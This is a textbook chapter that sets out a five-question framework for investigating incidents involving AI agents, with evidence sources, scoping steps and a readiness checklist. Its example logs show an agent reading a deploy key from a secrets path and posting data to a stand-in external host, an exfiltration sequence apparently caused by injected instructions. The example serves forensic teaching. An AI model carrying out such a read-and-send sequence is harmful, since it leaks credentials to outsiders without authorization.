# Chapter 15 — The Five Forensic Questions Framework for Agent Incidents

## What You Will Learn

This chapter introduces the Five Forensic Questions framework — a structured approach to scoping and conducting agent incident investigations. You will learn to apply each question to direct evidence collection, determine the investigation scope using the framework, produce findings that support both technical remediation and regulatory reporting, and use the Five Questions as a pre-incident audit readiness checklist.

## Why This Matters

Agent incident investigations fail when they have no defined scope. Investigators follow tool call chains indefinitely, collect evidence without knowing what question it answers, and produce reports that are incomplete for some audiences and excessive for others.

The Five Forensic Questions provide a scope boundary: the investigation is complete when all five questions are answered to the required confidence level. If a question cannot be answered, the gap is explicitly documented — which is itself a finding, and often the most important one.

## The Five Forensic Questions

Applied to every agent incident investigation, in order:

### Q1 — What did the agent do?

**Definition:** A complete, ordered record of every action the agent took during the session under investigation. Actions include: tool calls made, tool parameters used, tool results received, and final output produced.

**Evidence sources:**
- Agent session audit log (if instrumented — see Chapter 10 and 14)
- Tool execution logs in downstream systems (API gateway logs, file access logs, database query logs, network proxy logs)
- Agent framework logs (LangChain trace, Claude tool_use API response history)

**Answer format:** A timestamped tool call chain. Example:
```
[14:42:01.332] read_file(path="/config/app.yaml") → returned 847 bytes
[14:42:03.114] read_file(path="/secrets/deploy_key.txt") → returned 64 bytes
[14:42:05.887] http_post(url="https://external.example.com/upload", body="...") → HTTP 200
```

**Investigation is complete for Q1 when:** Every tool call in the session is accounted for with timestamp, tool name, input parameters, and result disposition.

### Q2 — What was the agent instructed to do?

**Definition:** The full instruction set the agent received during the session, including the system prompt, the initial user instruction, and any subsequent messages that modified the agent's task.

**Evidence sources:**
- System prompt version control record (what system prompt was deployed at the time of the incident)
- User instruction log (the input that initiated the session)
- Intermediate user messages within the session
- Tool results that contained instruction-like content (a document the agent read that contained injected instructions)

**Answer format:** The verbatim system prompt, verbatim user instruction, and verbatim content of any tool results that may have functioned as instructions. Hash each element for integrity verification.

**Investigation is complete for Q2 when:** You have the system prompt that was in effect, the original user instruction, and have reviewed all tool results that the agent received for injection payloads.

**Common gap:** If the system prompt is not version-controlled, Q2 cannot be answered with certainty. Document this as a forensic infrastructure gap.

### Q3 — What data did the agent access or transmit?

**Definition:** A complete inventory of data the agent read from internal systems and data the agent transmitted to external systems or users, including the volume, sensitivity classification, and whether the access or transmission was authorized by the agent's policy.

**Evidence sources:**
- Tool call inputs (for read operations: what path, what query, what resource)
- Tool results returned to the agent (what data the tool call returned)
- Egress logs for any data transmitted externally (API gateway egress, DNS logs, proxy logs)
- Data classification system (what sensitivity tier does the accessed data belong to)

**Answer format:** Table of data elements accessed and transmitted, with sensitivity classification and authorization status.

**Investigation is complete for Q3 when:** Every read operation is mapped to a data element with sensitivity classification, and every write or egress operation is confirmed or ruled out.

### Q4 — What tools did the agent invoke and with what parameters?

**Definition:** The complete tool invocation record with full input parameters, not just tool names. This is distinct from Q1 (which asks what the agent did in aggregate) because Q4 focuses on the specific parameters passed — which may reveal the precision of an attacker's injection or the exact data targeted.

**Evidence sources:**
- Agent session audit log with full parameter capture
- Tool execution logs at the tool level (not just the call, but what the tool received)

**Answer format:** JSON record of each tool call with full input parameters. Example:
```json
{
  "tool": "read_file",
  "inputs": {"path": "/secrets/deploy_key.txt"},
  "timestamp": "2026-04-07T14:42:03.114Z",
  "result_hash": "a3f2b1c4"
}
```

**Investigation is complete for Q4 when:** Every tool call has a complete parameter record. Incomplete parameter records (due to logging gaps) are documented as gaps.

### Q5 — What was the authorization basis for each action?

**Definition:** For each tool call the agent made, the authorization basis — the policy that permitted the agent to invoke that tool with those parameters at that time. This is the question that distinguishes authorized from unauthorized actions and is the most frequently unanswerable question in agent incidents.

**Evidence sources:**
- Agent tool authorization policy at the time of the incident (see Chapter 9)
- Authorization decision log (if the agent framework logs authorization decisions)
- Any approval events (human approvals, governance board sign-offs) relevant to the session

**Answer format:** For each tool call, one of:
- **Authorized:** "Agent policy v2.1 grants read access to /config/* and /secrets/* for sessions initiated by CI/CD automation role."
- **Unauthorized:** "Agent policy v2.1 does not grant http_post access. This action was executed outside policy."
- **Undetermined:** "Authorization policy at time of incident is not version-controlled. Cannot determine whether this action was within policy."

**Investigation is complete for Q5 when:** Every tool call has been classified as authorized, unauthorized, or undetermined with documented evidence basis.

## Using the Five Questions to Scope the Investigation

At the start of an agent incident investigation:

1. **Identify the session(s) under investigation.** A session has a defined start (first message to the model) and end (terminal response or timeout). Multi-session incidents require applying the Five Questions to each session.

2. **Assess evidence availability for each question.** Before beginning collection, determine what evidence exists and what gaps are present. This assessment takes 30–60 minutes and prevents hours of investigation effort toward answers that cannot be obtained.

3. **Set confidence targets.** For each question, define the confidence level required for the investigation purpose:
   - Regulatory reporting: Q1–Q4 must be answered to high confidence; Q5 must be answered definitively
   - Internal remediation: Q1 and Q3 are highest priority; Q5 can be reported as a gap
   - Executive communication: Q1 (what happened) and Q3 (what data was affected) are primary

4. **Declare investigation complete** when all Five Questions are answered to the required confidence level, or when all remaining unanswered questions are documented as evidence gaps with root cause.

## The Five Questions as an Audit Readiness Checklist

Before an incident occurs, evaluate your forensic readiness by asking whether you could answer each of the Five Questions for a hypothetical incident today:

| Question | Forensic readiness check |
|---|---|
| Q1 — What did the agent do? | Is your agent audit log capturing every tool call with timestamp and result? |
| Q2 — What was the agent instructed to do? | Is your system prompt version-controlled? Is the user instruction logged per session? |
| Q3 — What data did the agent access or transmit? | Are tool result contents captured (not just tool call inputs)? Are egress connections logged at the content level? |
| Q4 — What tools did the agent invoke and with what parameters? | Are full tool input parameters (not just tool names) in your audit log? |
| Q5 — What was the authorization basis for each action? | Is your agent authorization policy version-controlled? Are authorization decisions logged? |

A "no" answer to any readiness check is a forensic infrastructure gap that should be addressed before the next agent deployment.

## Framework Reference

`forensics-and-incident-response-framework/docs/agent-forensics/five-questions-framework.md`

## Hands-On Lab

→ [Lab: Applying the Five Forensic Questions to a Simulated Agent Incident](lab/README.md)
